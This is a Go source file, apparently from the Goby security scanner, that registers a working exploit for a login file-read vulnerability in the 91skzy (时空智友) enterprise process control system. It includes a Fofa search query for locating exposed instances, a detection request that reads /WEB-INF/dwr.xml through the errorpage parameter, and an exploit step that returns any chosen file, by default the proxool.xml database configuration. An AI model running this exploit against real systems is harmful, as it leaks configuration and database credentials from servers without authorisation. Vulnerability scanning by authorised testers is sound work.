package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "91skzy Enterprise process control system login File Read vulnerability",
    "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p>Spatiotemporal Zhiyou enterprise process control system login file read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Product": "时空智友企业流程化管控系统",
    "Homepage": "http://www.91skzy.net",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"企业流程化管控系统\" && body=\"密码(Password):\"",
    "GobyQuery": "body=\"企业流程化管控系统\" && body=\"密码(Password):\"",
    "Level": "2",
    "Impact": "<p>Spatiotemporal Zhiyou enterprise process control system login file read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "WEB-INF/classes/proxool.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "102",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "value=\"com.race.template.components.comment.UserAccess\"></param> ",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/xml",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<convert converter=\"bean\" match=\"net.jforum.entities.*\"/>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": "op=verify%7Clogin&targetpage=&errorpage={{{filePath}}}&mark=&tzo=480&username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "时空智友企业流程化管控系统 login 文件读取漏洞",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>时空智友企业流程化管控系统是使用JAVA开发为企业提供流程化管控的一款系统。</p><p>时空智友企业流程化管控系统 login 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>时空智友企业流程化管控系统login 文件读取漏洞,攻击者可利用该漏洞获取系统的敏感信息等。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "91skzy Enterprise process control system login File Read vulnerability",
            "Product": "时空智友企业流程化管控系统",
            "Description": "<p>Spatiotemporal Intelligent Friend enterprise process management and control system is a system that uses JAVA development to provide process management and control for enterprises.</p><p>Spatiotemporal Zhiyou enterprise process control system login file read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.91skzy.net\">http://www.91skzy.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Spatiotemporal Zhiyou enterprise process control system login file read vulnerability, attackers can use the vulnerability to obtain sensitive information of the system.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10803"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}